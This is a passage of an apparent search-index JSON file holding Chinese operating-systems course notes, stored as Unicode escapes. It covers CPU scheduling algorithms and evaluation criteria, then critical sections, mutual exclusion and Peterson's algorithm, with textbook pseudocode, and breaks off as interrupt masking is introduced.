\u8c03\u5ea6\u53ef\u80fd\u51fa\u73b0\u5728\u4efb\u610f\u4e00\u4e2a\u8fdb\u7a0b\u4e0a\uff0c\u4f46\u662f\u9700\u8981\u8bf7\u6c42\u8c03\u5ea6\u7684\u4e8b\u4ef6\u53d1\u751f\u540e\u624d\u80fd\u8fdb\u884c\u8c03\u5ea6\u3002\u8fdb\u7a0b\u8c03\u5ea6\u7684\u65b9\u5f0f\uff0c\u53ef\u5206\u4e3a\u62a2\u5360\u5f0f\u548c\u975e\u62a2\u5360\u5f0f\u4e24\u79cd\uff1a</p> <ul> <li>\u975e\u62a2\u5360\u5f0f\uff0cnonpreemptive \u5373\u4f7f\u6709\u4f18\u5148\u7ea7\u66f4\u9ad8\u7684\u4efb\u52a1\u8fdb\u5165\u5c31\u7eea\u961f\u5217\uff0c\u4e5f\u4e0d\u4f1a\u6253\u65ad\u5f53\u524d CPU \u6b63\u5728\u6267\u884c\u7684\u8fdb\u7a0b\uff0c\u76f4\u5230\u8be5\u8fdb\u7a0b\u8fd0\u884c\u7ed3\u675f\u6216\u67d0\u4e9b\u4e8b\u4ef6\u53d1\u751f<ul> <li>\u8c03\u5ea6\u53d1\u751f\u65f6\u673a\u4e3a Running =&gt; Terminated \u548c Running =&gt; Waiting</li> <li>\u4f18\u70b9\u662f\u5b9e\u73b0\u7b80\u5355\uff0c\u7cfb\u7edf\u5f00\u9500\u5c0f</li> </ul> </li> <li>\u62a2\u5360\u5f0f\uff0cpreemptive \u82e5\u6709\u4f18\u5148\u7ea7\u66f4\u9ad8\u7684\u4efb\u52a1\u8fdb\u5165\u5c31\u7eea\u961f\u5217\uff0c\u5219\u5141\u8bb8\u8c03\u5ea6\u7a0b\u5e8f\u6839\u636e\u67d0\u79cd\u539f\u5219\u53bb\u6682\u505c\u5f53\u524d\u6b63\u5728\u6267\u884c\u7684\u8fdb\u7a0b\uff0c\u5c06 CPU \u5206\u914d\u7ed9\u8fd9\u4e2a\u66f4\u91cd\u8981\u7684\u8fdb\u7a0b<ul> <li>\u8c03\u5ea6\u53ef\u4ee5\u53d1\u751f\u5728\u4efb\u4f55\u65f6\u5019</li> <li>\u62a2\u5360\u5f0f\u8c03\u5ea6\u63d0\u9ad8\u4e86\u7cfb\u7edf\u541e\u5410\u7387\u548c\u54cd\u5e94\u6548\u7387\uff0c\u4f46\u4f7f\u5f97\u8c03\u5ea6\u63a7\u5236\u66f4\u590d\u6742</li> </ul> </li> </ul>"},{"location":"Courses/OS/Topic3/#scheduling-algorithm","title":"Scheduling Algorithm","text":"<p>\u4e0d\u540c\u7684\u8c03\u5ea6\u7b97\u6cd5\u5177\u6709\u4e0d\u540c\u7279\u6027\uff0c\u4e3a\u4e86\u6bd4\u8f83\u6027\u80fd\uff0c\u6211\u4eec\u7ed9\u51fa\u4ee5\u4e0b\u51e0\u4e2a\u8bc4\u4ef7\u6807\u51c6\uff1a</p> <ul> <li>Maximize\u00a0CPU Utilization\u00a0: CPU \u4f7f\u7528\u7387\uff0c\u5373 CPU \u975e\u7a7a\u95f2\u7684\u65f6\u95f4\u6bd4\u4f8b</li> <li>Maximize\u00a0Throughput\u00a0: \u541e\u5410\u91cf\uff0c\u6bcf\u4e2a\u65f6\u95f4\u5355\u5143\u5185\u5b8c\u6210\u7684\u8fdb\u7a0b</li> <li>Minimize\u00a0Turnaround Time\u00a0: \u5468\u8f6c\u65f6\u95f4\uff0c\u4ece\u8fdb\u7a0b\u521b\u7acb\u5230\u8fdb\u7a0b\u5b8c\u6210\u7684\u65f6\u95f4\uff0c\u662f\u7b49\u5f85\u8fdb\u5165\u5185\u5b58\u3001\u5728 ready queue \u4e2d\u7b49\u5f85\u3001\u5728 CPU \u4e0a\u6267\u884c\u3001I/O \u6267\u884c\u7b49\u65f6\u95f4\u7684\u603b\u548c</li> <li>Minimize\u00a0Waiting Time\u00a0: \u7b49\u5f85\u65f6\u95f4\uff0c\u5728 ready queue \u4e2d\uff08\u6216\u5728 Ready \u72b6\u6001\u4e0b\uff09\u7b49\u5f85\u6240\u82b1\u7684\u65f6\u95f4\u4e4b\u548c</li> <li>Minimize\u00a0Response Time\u00a0: \u54cd\u5e94\u65f6\u95f4\uff0c\u4ea4\u4e92\u7cfb\u7edf\u4ece\u8fdb\u7a0b\u521b\u7acb\u5230\u7b2c\u4e00\u6b21\u4ea7\u751f\u54cd\u5e94\u7684\u65f6\u95f4</li> </ul> <p>\u8ba1\u7b97\u9898\u4e2d\uff0c\u5468\u8f6c\u65f6\u95f4\u7b49\u4e8e\u5b8c\u6210\u65f6\u95f4\u51cf\u53bb\u5230\u8fbe\u65f6\u95f4\uff0c\u7b49\u5f85\u65f6\u95f4\u4e3a\u5468\u8f6c\u65f6\u95f4\u51cf\u53bb CPU burst time</p> <p>\u57fa\u4e8e\u4e0a\u8ff0\u4e0d\u540c\u76ee\u7684\uff0c\u591a\u79cd\u8c03\u5ea6\u7b97\u6cd5\u88ab\u8bbe\u8ba1\u51fa\u6765\u3002</p> <p>First-Come First Serve</p> <p>FCFS \u7b97\u6cd5\u662f\u975e\u62a2\u5360\u5f0f\u7684\u4e00\u4e2a\u6700\u7b80\u5355\u8c03\u5ea6\u7b97\u6cd5\u3002</p> <p>\u5b83\u4f7f\u7528 FIFO \u961f\u5217\u6765\u5b9e\u73b0 Ready Queue\uff0c\u6bcf\u6b21\u4ece\u5c31\u7eea\u961f\u5217\u4e2d\u9009\u62e9\u6700\u5148\u8fdb\u5165\u8be5\u961f\u5217\u7684\u8fdb\u7a0b\uff0c\u76f4\u5230\u8fd0\u884c\u5b8c\u6210\u6216\u67d0\u4e8b\u4ef6\u53d1\u751f\u963b\u585e\u65f6\u624d\u91ca\u653e CPU\u3002</p> <p>\u82e5\u4e00\u4e2a\u957f\u4f5c\u4e1a\u5148\u5230\u8fbe\u7cfb\u7edf\uff0c\u5c31\u4f1a\u4f7f\u540e\u9762\u7684\u8bb8\u591a\u77ed\u4f5c\u4e1a\u7b49\u5f85\u5f88\u957f\u4e8b\u4ef6\uff0c\u56e0\u6b64\u5b83\u4e0d\u80fd\u4f5c\u4e3a\u5206\u65f6\u7cfb\u7edf\u548c\u5b9e\u65f6\u7cfb\u7edf\u7684\u4e3b\u8981\u8c03\u5ea6\u7b56\u7565\u3002</p> <p>Shortest-Job-First</p> <p>SJF \u662f\u5bf9\u77ed\u8fdb\u7a0b\u4f18\u5148\u8c03\u5ea6\u7684\u7b97\u6cd5\uff0c\u5b83\u6709\u62a2\u5360\u5f0f\u548c\u975e\u62a2\u5360\u5f0f\u7684\u4e24\u79cd\u5b9e\u73b0\u3002</p> <p>SJF \u7684\u6838\u5fc3\u601d\u60f3\u662f\u4ece Ready Queue \u4e2d\u9009\u62e9\u4f30\u8ba1\u4e0b\u4e00\u6b21\u8fd0\u884c\u65f6\u95f4\u6700\u77ed\u7684\u8fdb\u7a0b\u8fd0\u884c\u3002\u5bf9\u4e8e\u975e\u62a2\u5360\u5f0f\u7cfb\u7edf\uff0c\u300c\u4f30\u8ba1\u4e0b\u4e00\u6b21\u8fd0\u884c\u65f6\u95f4\u300d\u6307\u8be5\u8fdb\u7a0b\u6240\u9700\u7684\u603b\u8fd0\u884c\u65f6\u95f4\uff1b\u5bf9\u4e8e\u62a2\u5360\u5f0f\u7cfb\u7edf\uff0c\u300c\u4f30\u8ba1\u4e0b\u4e00\u6b21\u8fd0\u884c\u65f6\u95f4\u300d\u6307\u8be5\u8fdb\u7a0b\u7684\u5269\u4f59\u8fd0\u884c\u65f6\u95f4\u3002</p> <ul> <li>\\&lt;nnonpreemptive&gt; Shortest-next-CPU-burst \u2013 once CPU given to the process it cannot be preempted until completes its CPU burst</li> <li>\\&lt;preemptive&gt; Shortest-remaining-time-first \u2013 if a new process arrives with CPU burst length less than remaining time of current executing process, preempt.</li> </ul> <p>\u5728\u7ed9\u5b9a\u4e00\u4e2a Processes \u96c6\u5408\uff0cSJF \u53ef\u4ee5\u786e\u4fdd\u5177\u6709\u6700\u4f73\u7684 Minimum Average Waiting Time\u3002</p> <p>SJF \u7b97\u6cd5\u7684\u7f3a\u70b9</p> <ul> <li>\u5bf9\u957f\u8fdb\u7a0b\u4e0d\u5229\uff0c\u4ea7\u751f Starvation \u73b0\u8c61</li> <li>\u5b8c\u5168\u672a\u8003\u8651\u8fdb\u7a0b\u7684\u4f18\u5148\u7ea7</li> <li>\u300c\u4f30\u8ba1\u4e0b\u4e00\u6b21\u8fd0\u884c\u65f6\u95f4\u300d\u901a\u8fc7\u9884\u6d4b\u5f97\u5230\uff0c\u5e76\u4e0d\u5b8c\u5168\u51c6\u786e</li> </ul> <p>Round-Robin</p> <p>RR \u7b97\u6cd5\u662f\u9002\u7528\u4e8e\u5206\u65f6\u7cfb\u7edf\u7684\u62a2\u5360\u5f0f\u8c03\u5ea6\u7b97\u6cd5\u3002</p> <p>RR \u7b97\u6cd5\u5b9a\u4e49\u4e86\u4e00\u4e2a\u8f83\u5c0f\u7684\u56fa\u5b9a\u65f6\u95f4\u5355\u5143\u65f6\u95f4\u7247\uff08time slice / quantum\uff09\uff0c\u4fdd\u8bc1\u4efb\u4f55\u4e00\u4e2a\u8fdb\u7a0b\u90fd\u4e0d\u4f1a\u8fde\u7eed\u8fd0\u884c\u8d85\u8fc7\u4e00\u4e2a\u65f6\u95f4\u7247\u7684\u65f6\u95f4\uff08\u9664\u975e\u8fd9\u662f Ready Queue \u7684\u552f\u4e00\u8fdb\u7a0b\uff09\u3002</p> <p>\u5982\u679c\u4e00\u4e2a\u8fdb\u7a0b\u5728\u65f6\u95f4\u7247\u672a\u7528\u5b8c\u524d\u5c31\u7ed3\u675f\uff0c\u7cfb\u7edf\u4e5f\u4f1a\u7acb\u5373\u8fdb\u884c\u8fdb\u7a0b\u8c03\u5ea6</p> <p>\u5b83\u5c06\u6240\u6709\u5c31\u7eea\u8fdb\u7a0b\u6309\u7167 FCFS \u7b56\u7565\u6392\u6210 Ready Queue\uff0c\u6bcf\u9694\u4e00\u4e2a\u65f6\u95f4\u7247\u4fbf\u4ea7\u751f\u4e00\u6b21\u65f6\u949f\u4e2d\u65ad\u6fc0\u6d3b\u8c03\u5ea6\u7a0b\u5e8f\uff0c\u5c06 CPU \u5206\u914d\u7ed9\u5c31\u7eea\u961f\u5217\u7684\u961f\u9996\u8fdb\u7a0b\u3002\u88ab\u5265\u593a\u7684\u8fdb\u7a0b\u56de\u5230\u5c31\u7eea\u961f\u5217\u7684\u672b\u5c3e\u91cd\u65b0\u6392\u961f\uff0c\u7b49\u5019\u518d\u6b21\u8fd0\u884c\u3002</p> <p>\u76f8\u6bd4 SJF \u7b97\u6cd5\u800c\u8a00\uff0cRR \u7b97\u6cd5\u7684\u5e73\u5747\u7b49\u5f85\u65f6\u95f4\u66f4\u957f\uff0c\u4f46\u662f\u54cd\u5e94\u65f6\u95f4\u66f4\u77ed\u3002</p> <p>Quantum \u7684\u9009\u62e9\u5bf9 RR \u7b97\u6cd5\u7684\u6027\u80fd\u5f71\u54cd\u5f88\u5927\u3002\u5982\u679c\u65f6\u95f4\u7247\u8db3\u591f\u5927\uff0c\u4ee5\u81f3\u4e8e\u6240\u6709\u8fdb\u7a0b\u90fd\u80fd\u5728\u4e00\u4e2a\u65f6\u95f4\u7247\u5185\u6267\u884c\u5b8c\u6bd5\uff0c\u5219 RR \u7b97\u6cd5\u9000\u5316\u4e3a FCFS \u7b97\u6cd5\uff1b\u5982\u679c\u65f6\u95f4\u7247\u975e\u5e38\u5c0f\uff0c\u5219 CPU \u5c06\u5728\u8fdb\u7a0b\u95f4\u9891\u7e41\u5207\u6362\uff0c\u771f\u6b63\u7528\u4e8e\u8fd0\u884c\u7528\u6237\u8fdb\u7a0b\u7684\u65f6\u95f4\u5c06\u51cf\u5c0f\u3002</p> <p>\u200b\u5728\u5b9e\u8df5\u4e2d\uff0c\u65f6\u95f4\u7247\u5927\u7ea6 10~100ms\uff0c\u6bcf\u6b21 context-switch \u7ea6 10\u03bcs\u3002\u5373 context-switch \u7684\u65f6\u95f4\u82b1\u8d39\u662f\u6bd4\u8f83\u5c0f\u7684\u3002</p> <p>\u5982\u679c\u4e00\u4e2a\u8fdb\u7a0b\u65f6\u95f4\u7247\u7528\u5b8c\u7684\u540c\u65f6\u6709\u65b0\u8fdb\u7a0b\u5230\u8fbe\uff0c\u600e\u4e48\u5904\u7406 Ready Queue \u987a\u5e8f\uff1f</p> <p>\u5148\u5c06\u65f6\u95f4\u7247\u7528\u5b8c\u7684\u8fdb\u7a0b\u653e\u5165 Ready Queue \u7684\u961f\u5c3e\uff0c\u518d\u5c06\u540c\u4e00\u65f6\u523b\u5230\u8fbe\u7684\u65b0\u8fdb\u7a0b\u4f9d\u6b21\u52a0\u5165\u961f\u5c3e\u3002</p> <p>Priority Scheduling</p> <p>\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u8bbe\u5b9a\u4f18\u5148\u7ea7\uff0c\u6bcf\u6b21\u4ece\u5c31\u7eea\u961f\u5217\u4e2d\u9009\u62e9\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u8fdb\u7a0b\uff0c\u5b83\u4e5f\u5b9e\u73b0\u4e3a\u62a2\u5360\u5f0f\u7684\u548c\u975e\u62a2\u5360\u5f0f\u7684\u3002</p> <p>\u8fd9\u91cc\u7684\u4f18\u5148\u7ea7\u53ef\u4ee5\u662f\u9759\u6001\u7684\uff08\u5982\u8fdb\u7a0b\u7c7b\u578b\u3001\u5bf9\u8d44\u6e90\u7684\u8981\u6c42\u3001\u7528\u6237\u8981\u6c42\uff09\uff0c\u4e5f\u53ef\u4ee5\u662f\u52a8\u6001\u7684\uff08\u5982\u4f18\u5148\u7ea7\u968f\u7b49\u5f85\u65f6\u95f4\u589e\u52a0\u800c\u63d0\u9ad8\uff09\u3002</p> <p>\u4f8b\u5982 SJF \u7b97\u6cd5\u5c31\u662f\u4ee5\u4f30\u7b97 CPU \u8fd0\u884c\u65f6\u95f4\u4e3a\u4f18\u5148\u7ea7\u7684 Priority Scheduling\uff0c\u6211\u4eec\u77e5\u9053\u4f18\u5148\u7ea7\u4f4e\u7684\u8fdb\u7a0b\u53ef\u80fd\u957f\u65f6\u95f4\u4e0d\u4f1a\u88ab\u6267\u884c\uff0c\u9020\u6210 Starvation \u73b0\u8c61\uff0c\u89e3\u51b3\u65b9\u6cd5\u5c31\u662f\u8bbe\u7f6e\u52a8\u6001\u4f18\u5148\u7ea7\uff0c\u4f7f\u5f97\u4f18\u5148\u7ea7\u521d\u503c\u8f83\u4f4e\u7684\u8fdb\u7a0b\u5728\u7b49\u5f85\u8db3\u591f\u957f\u65f6\u95f4\u540e\u4e5f\u53ef\u4ee5\u83b7\u5f97 CPU \u8d44\u6e90\u3002</p> <p>Multi-Level Queue</p> <p>\u591a\u7ea7\u961f\u5217\u8c03\u5ea6\u7b97\u6cd5\u5728\u7cfb\u7edf\u4e2d\u8bbe\u7f6e\u591a\u4e2a Ready Queue\uff0c\u5c06\u4e0d\u540c\u7c7b\u578b\u6216\u6027\u8d28\u7684\u8fdb\u7a0b\u56fa\u5b9a\u5206\u914d\u5230\u4e0d\u540c\u7684\u5c31\u7eea\u961f\u5217\uff0c\u7cfb\u7edf\u53ef\u6839\u636e\u4e0d\u540c\u7528\u6237\u8fdb\u7a0b\u7684\u9700\u6c42\u4e3a\u6bcf\u4e2a\u961f\u5217\u9009\u62e9\u4e0d\u540c\u8c03\u5ea6\u7b56\u7565\u3002</p> <p>\u4f8b\u5982\u524d\u53f0\u961f\u5217\u53ef\u4ee5\u4f7f\u7528 RR \u8c03\u5ea6\u4fdd\u8bc1 response\uff0c\u540e\u53f0\u961f\u5217\u53ef\u4ee5\u4f7f\u7528 FCFS\u3002\u5f53\u7136\uff0c\u4e0d\u540c\u961f\u5217\u4e4b\u95f4\u4e5f\u5e94\u8be5\u6709\u8c03\u5ea6\uff0c\u4f8b\u5982 &lt;1&gt; Fixed Priority Sheduling\uff0c\u4ec5\u4f18\u5148\u7ea7\u9ad8\u7684\u524d\u53f0\u961f\u5217\u4e3a\u7a7a\u65f6\u624d\u80fd\u591f\u6267\u884c\u4f18\u5148\u7ea7\u4f4e\u7684\u540e\u53f0\u961f\u5217\uff1b\u6216 &lt;2&gt; Time Slice\uff0c\u4e24\u4e2a\u961f\u5217\u90fd\u6709\u4e00\u4e2a\u786e\u5b9a\u7684 CPU \u65f6\u95f4\uff0c\u5f53\u65f6\u95f4\u5230\u4e86\u5219\u8f6c\u5411\u53e6\u4e00\u4e2a\u961f\u5217\uff0c\u4e00\u822c 80% \u65f6\u95f4\u7528\u4e8e\u524d\u53f0\uff0c20% \u65f6\u95f4\u7528\u4e8e\u540e\u53f0\u3002</p> <p>\u5728\u591a CPU \u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u4e3a\u6bcf\u4e2a CPU \u8bbe\u7f6e\u5355\u72ec\u7684\u5c31\u7eea\u961f\u5217\u3002</p> <p>Multi-Level Feedback Queue</p> <p>\u591a\u7ea7\u53cd\u9988\u961f\u5217\u8c03\u5ea6\u7b97\u6cd5\u878d\u5408\u524d\u51e0\u79cd\u7b97\u6cd5\u7684\u4f18\u70b9\uff0c\u901a\u8fc7\u52a8\u6001\u8c03\u6574\u8fdb\u7a0b\u4f18\u5148\u7ea7\u548c\u65f6\u95f4\u5927\u5c0f\uff0c\u53ef\u4ee5\u517c\u987e\u591a\u65b9\u9762\u7684\u7cfb\u7edf\u76ee\u6807\u3002</p> <p>\u3010Example\u3011 \u6709\u4e09\u4e2a Ready Queue\uff0c\u5206\u522b\u91c7\u7528 RR\uff0cRR\uff0cFCFS \u7b97\u6cd5\uff0c\u4f18\u5148\u7ea7\u4f9d\u6b21\u964d\u4f4e\u3002</p> <p>\u4e00\u4e2a\u8fdb\u7a0b Ready \u65f6\u5148\u8fdb\u5165 \\(Q_0\\)\uff0c\u8be5\u8fdb\u7a0b\u540e\u83b7\u5f97 CPU \u6709 8ms \u65f6\u95f4\u5b8c\u6210\u4efb\u52a1\uff0c\u5426\u5219\u88ab\u6253\u65ad\u8fdb\u5165 \\(Q_1\\)\uff1b\u53ea\u6709\u5f53\u961f\u5217 \\(Q_0\\) \u4e2d\u6240\u6709\u8fdb\u7a0b\u6267\u884c\u5b8c\u65f6\u624d\u4f1a\u8fd0\u884c \\(Q_1\\)\uff0c\u8fdb\u7a0b\u5728 \\(Q_1\\) \u540c\u7406\uff0c\u5982\u679c\u6ca1\u5728 16ms \u5b8c\u6210\u4efb\u52a1\u5219\u8fdb\u5165 \\(Q_2\\)\uff1b\u6700\u540e \\(Q_2\\) \u91c7\u53d6 FCFS \u7b97\u6cd5\uff0c\u53ea\u6709 \\(Q_0,Q_1\\) \u5747\u4e3a\u7a7a\u65f6\u624d\u4f1a\u88ab\u6267\u884c\u3002</p> <p></p>"},{"location":"Courses/OS/Topic3/#process-synchronization","title":"Process Synchronization","text":""},{"location":"Courses/OS/Topic3/#critical-section","title":"Critical Section","text":"<p>\u867d\u7136\u591a\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u5171\u4eab\u7cfb\u7edf\u4e2d\u7684\u5404\u79cd\u8d44\u6e90\uff0c\u4f46\u5176\u4e2d\u8bb8\u591a\u8d44\u6e90\u4e00\u6b21\u53ea\u80fd\u4e3a\u4e00\u4e2a\u8fdb\u7a0b\u6240\u7528\uff0c\u6211\u4eec\u5c06\u4e00\u6b21\u4ec5\u5141\u8bb8\u4e00\u4e2a\u8fdb\u7a0b\u4f7f\u7528\u7684\u8d44\u6e90\u6210\u4e3a Critical Resource\uff0c\u5305\u62ec\u6253\u5370\u673a\u7b49\u7269\u7406\u8bbe\u5907\uff0c\u4ee5\u53ca\u53ef\u88ab\u82e5\u5e72\u8fdb\u7a0b\u5171\u4eab\u7684\u53d8\u91cf\u3001\u6570\u636e\u7b49\u3002</p> <p>\u5bf9 Critical Resource \u7684\u8bbf\u95ee\u5fc5\u987b\u4e92\u65a5\u5730\u8fdb\u884c\uff0c\u5728\u6bcf\u4e2a\u8fdb\u7a0b\u4e2d\uff0c\u8bbf\u95ee Critical Resource \u7684\u90a3\u6bb5\u4ee3\u7801\u79f0\u4e3a Critical Section\u3002\u6211\u4eec\u5c06\u4e34\u754c\u8d44\u6e90\u7684\u8bbf\u95ee\u8fc7\u7a0b\u5206\u4e3a\u56db\u4e2a\u90e8\u5206\uff1a</p> <pre><code>while (true) {\n    entry section;      // \u8fdb\u5165\u533a \u68c0\u67e5\u8fdb\u7a0b\u662f\u5426\u53ef\u4ee5\u8fdb\u5165\u4e34\u754c\u533a\n    critical section;   // \u4e34\u754c\u533a \u8bbf\u95ee\u4e34\u754c\u8d44\u6e90\n    exit section;       // \u9000\u51fa\u533a \u6e05\u9664\u6b63\u5728\u8bbf\u95ee\u4e34\u754c\u533a\u7684\u6807\u5fd7\n    remainder section;  // \u5269\u4f59\u533a \u5269\u4f59\u4ee3\u7801\n}\n</code></pre>"},{"location":"Courses/OS/Topic3/#mutual-exclusion-mutex","title":"Mutual Exclusion (Mutex)","text":"<p>\u4e92\u65a5\u4e5f\u88ab\u79f0\u4e3a\u95f4\u63a5\u5236\u7ea6\u5173\u7cfb\uff0c\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u8fdb\u5165 Critical Section \u4f7f\u7528\u4e34\u754c\u8d44\u6e90\u65f6\uff0c\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u5fc5\u987b\u7b49\u5f85\u3002</p> <p>\u5b9e\u73b0\u4e92\u65a5\u7684\u57fa\u672c\u65b9\u6cd5\u5305\u62ec\u8f6f\u786c\u4ef6\u65b9\u6cd5\u3001\u4e92\u65a5\u9501\u3001\u4fe1\u53f7\u91cf\u7b49\u3002\u540c\u6b65\u4e0e\u4e92\u65a5\u5e94\u5c3d\u53ef\u80fd\u9075\u5faa\u4ee5\u4e0b\u539f\u5219\uff1a</p> <ul> <li>&lt;1&gt; \u7a7a\u95f2\u8ba9\u8fdb\uff1a\u4e34\u754c\u533a\u7a7a\u95f2\uff0c\u5219\u5141\u8bb8\u8bf7\u6c42\u8fdb\u5165\u7684\u8fdb\u7a0b\u7acb\u5373\u8fdb\u5165</li> <li>&lt;2&gt; \u5fd9\u5219\u7b49\u5f85\uff1a\u5df2\u6709\u8fdb\u7a0b\u8fdb\u5165\u4e34\u754c\u533a\u65f6\uff0c\u5176\u5b83\u8bd5\u56fe\u8fdb\u5165\u7684\u8fdb\u7a0b\u5fc5\u987b\u7b49\u5f85</li> <li>&lt;3&gt; \u6709\u9650\u7b49\u5f85\uff1a\u4fdd\u8bc1\u7b49\u5f85\u65f6\u95f4\u6709\u9650</li> <li>&lt;4&gt; \u8ba9\u6743\u7b49\u5f85\uff1a\u5f53\u8fdb\u7a0b\u4e0d\u80fd\u8fdb\u5165\u4e34\u754c\u533a\u65f6\uff0c\u5e94\u7acb\u5373\u91ca\u653e\u5904\u7406\u5668\uff0c\u9632\u6b62\u5fd9\u7b49\u5f85</li> </ul> <p>\u8f6f\u4ef6\u5b9e\u73b0\u65b9\u6cd5</p> <pre><code>/// P0                       P1\nwhile (true)                 while (true)\n{                            {\n    while (turn!=0);             while (turn!=1);    // \u8fdb\u5165\u533a\n    critical section;            critical section;   // \u4e34\u754c\u533a\n    turn = 1;                    turn = 0;           // \u9000\u51fa\u533a\n    remainder section;           remainder section;  // \u5269\u4f59\u533a\n}                            }\n</code></pre> <p>\u8be5\u7b97\u6cd5\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u516c\u7528\u6574\u578b\u53d8\u91cf <code>turn</code>\uff0c\u8868\u793a\u5141\u8bb8\u8fdb\u5165\u4e34\u754c\u533a\u7684\u8fdb\u7a0b\u7f16\u53f7\u3002\u5f53 <code>turn=0</code> \u65f6\uff0c\u8868\u793a\u5141\u8bb8\u8fdb\u7a0b \\(P_0\\) \u8fdb\u5165\u4e34\u754c\u533a\uff1b\u5f53 <code>turn=1</code> \u65f6\uff0c\u8868\u793a\u5141\u8bb8\u8fdb\u7a0b \\(P_1\\) \u8fdb\u5165\u4e34\u754c\u533a\u3002\u8fdb\u7a0b\u9000\u51fa\u4e34\u754c\u533a\u65f6\u4f1a\u5c06\u4f7f\u7528\u6743\u8d4b\u4e88\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u3002</p> <p>\u4f46\u662f\u8be5\u7b97\u6cd5\u8981\u6c42\u4e24\u4e2a\u8fdb\u7a0b\u5fc5\u987b\u4ea4\u66ff\u4f7f\u7528\u4e34\u754c\u8d44\u6e90\uff0c\u5982\u679c\u8fdb\u7a0b \\(P_0\\) \u79bb\u5f00\u5916\u5c42\u5faa\u73af\uff0c\u90a3\u4e48\u53d8\u91cf <code>turn</code> \u6c38\u8fdc\u4e0d\u4f1a\u88ab\u8bbe\u7f6e\u4e3a 1\uff0c\u6b64\u65f6 \\(P_1\\) \u65e0\u6cd5\u518d\u6b21\u8fdb\u5165\u4e34\u754c\u533a\uff0c\u8fdd\u80cc\u4e86\u201c\u7a7a\u95f2\u8ba9\u8fdb\u201d\u7684\u539f\u5219\u3002</p> <p>\u4f5c\u4e3a\u6539\u8fdb\uff0c\u6211\u4eec\u6709\u5982\u4e0b\u53cc\u6807\u5fd7\u5148\u68c0\u67e5\u6cd5\uff1a</p> <pre><code>/// P0                       P1\nwhile (true)                 while (true)\n{                            {\n    while (flag[1]);             while (flag[0]);    // \u8fdb\u5165\u533a\n    flag[0] = true;              flag[1] = true;\n    critical section;            critical section;   // \u4e34\u754c\u533a\n    flag[0] = false;             flag[1] = false;    // \u9000\u51fa\u533a\n    remainder section;           remainder section;  // \u5269\u4f59\u533a\n}                            }\n</code></pre> <p>\u8fd9\u6837\u65e2\u4e0d\u4f1a\u53d1\u751f\u4e0a\u8ff0\u7684\u60c5\u51b5\uff0c\u4e5f\u5141\u8bb8\u8fdb\u7a0b\u8fde\u7eed\u4f7f\u7528\u4e34\u754c\u8d44\u6e90\u3002\u4f46\u662f\u56e0\u4e3a\u5bf9 <code>flag</code> \u7684\u68c0\u67e5\u548c\u8bbe\u7f6e\u4e0d\u662f\u539f\u5b50\u6027\u7684\uff0c\u53ef\u80fd\u5b58\u5728\u4ee5\u4e0b\u60c5\u51b5\uff1a</p> <p>\u8fdb\u7a0b \\(P_0\\) \u548c \\(P_1\\) \u540c\u65f6\u60f3\u8981\u8bbf\u95ee\u4e34\u754c\u8d44\u6e90\uff0c\u5728 entry section \u5bf9 <code>flag</code> \u68c0\u67e5\u90fd\u901a\u8fc7\uff0c\u5bfc\u81f4\u53cc\u65b9\u540c\u65f6\u8fdb\u5165\u4e34\u754c\u533a\uff0c\u8fdd\u80cc\u201c\u5fd9\u5219\u7b49\u5f85\u201d\u539f\u5219\u3002</p> <p>\u6b64\u65f6\u82e5\u5c06\u68c0\u67e5\u653e\u5728\u8bbe\u7f6e\u540e\u9762\uff0c\u867d\u7136\u4e0d\u4f1a\u51fa\u73b0\u53cc\u65b9\u540c\u65f6\u8fdb\u5165\u7684\u60c5\u51b5\uff0c\u4f46\u662f\u4f1a\u51fa\u73b0\u53cc\u65b9\u540c\u65f6\u5bf9\u81ea\u5df1\u7684 <code>flag</code> \u8fdb\u884c\u4e86\u8bbe\u7f6e\uff0c\u5bfc\u81f4\u68c0\u67e5\u90fd\u4e0d\u901a\u8fc7\u7684\u9965\u997f\u73b0\u8c61\u3002</p> <p>Peterson \u7b97\u6cd5\u7ed3\u5408\u4e86\u4ee5\u4e0a\u7b97\u6cd5\u7684\u601d\u60f3\uff0c\u5229\u7528 <code>flag[]</code> \u89e3\u51b3\u4e92\u65a5\u8bbf\u95ee\u95ee\u9898\uff0c\u5229\u7528 <code>turn</code> \u89e3\u51b3\u9965\u997f\u95ee\u9898\uff0c\u5176\u6838\u5fc3\u601d\u60f3\u662f\uff0c\u82e5\u53cc\u65b9\u90fd\u60f3\u8981\u8fdb\u5165\u4e34\u754c\u533a\uff0c\u5219\u5c06\u8fdb\u5165\u7684\u673a\u4f1a\u201c\u8c26\u8ba9\u201d\u7ed9\u5bf9\u65b9\uff1a</p> <pre><code>/// P0                       P1\nwhile (true)                 while (true)\n{                            {\n    flag[0] = true;              flag[1] = true;     // \u8fdb\u5165\u533a\n    turn = 1;                    turn = 0;\n    while (flag[1]&amp;&amp;turn==1);    while (flag[0]&amp;&amp;turn==0);\n    critical section;            critical section;   // \u4e34\u754c\u533a\n    flag[0] = false;             flag[1] = false;    // \u9000\u51fa\u533a\n    remainder section;           remainder section;  // \u5269\u4f59\u533a\n}                            }\n</code></pre> <p>Peterson \u7b97\u6cd5\u5f88\u597d\u5730\u9075\u5faa\u4e86\u7a7a\u95f2\u8ba9\u8fdb\u3001\u5fd9\u5219\u7b49\u5f85\u3001\u6709\u9650\u7b49\u5f85\u4e09\u4e2a\u539f\u5219\uff0c\u4f46\u4ecd\u672a\u5b9e\u73b0\u8ba9\u6743\u7b49\u5f85</p> <p>\u786c\u4ef6\u5b9e\u73b0\u65b9\u6cd5 1\uff1a\u4e2d\u65ad\u5c4f\u853d</p> <p>CPU \u53ea\u4f1a\u5728\u53d1\u751f\u4e2d\u65ad\u65f6\u5207\u6362\u8fdb\u7a0b\uff0c\u56e0\u6b64\u5c4f\u853d\u4e2d\u65ad\u80fd\u591f\u4fdd\u8bc1\u5f53\u524d\u8fd0\u884c\u7684\u8fdb\u7a0b\u8ba9\u4e34\u754c\u533a\u7684\u4ee3\u7801\u987a\u5229\u6267\u884c\u5b8c\uff0c\u5176\u5178\u578b\u6a21\u5f0f\u4e3a\uff1a</p> 